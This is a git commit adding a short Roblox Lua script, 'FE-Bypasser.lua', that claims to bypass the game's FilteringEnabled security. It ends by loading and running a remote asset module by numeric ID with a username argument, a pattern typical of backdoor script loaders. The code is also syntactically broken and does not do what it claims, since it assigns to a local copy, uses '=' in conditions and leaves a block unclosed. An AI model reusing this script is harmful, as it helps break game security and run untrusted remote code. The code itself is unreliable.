f32512e7bd1500c85d6948be7ffd43ca3eb2691a
IvanTheProtogen <122665922+IvanTheProtogen@users.noreply.github.com>
2023-01-17 17:49:57 +0300

    FE-Bypasser.lua
    A source of course.

---
+++ FE-Bypasser.lua
@@ -0,0 +1,13 @@
+local fe = game.Workspace.FilteringEnabled
+
+print('FE Bypasser Beta v1.0.0')
+
+if fe = true then
+	repeat
+		fe = false
+		wait()
+	until false
+	
+if fe = false then
+	require(4848156552)('DEV_helloivan')
+end
